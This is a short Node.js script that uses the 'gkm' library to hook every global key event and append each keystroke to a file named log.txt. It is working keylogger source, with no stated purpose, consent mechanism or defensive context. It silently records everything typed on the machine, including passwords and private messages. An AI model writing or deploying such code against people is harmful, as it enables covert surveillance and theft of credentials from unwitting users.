const gkm = require('gkm');
const fs = require('fs');

let rem;

function log(data) {
    if(data == rem) return;
    rem = data;
    if(data == undefined || data == "Undefined") return;
    data = data.replace("Space", " ");
    console.log(data);
    fs.appendFile('log.txt', `${data}`, (err) => {
        if (err) throw err;
    });
}

gkm.events.on('key.*', function (data) {
    log(data[0]);
});
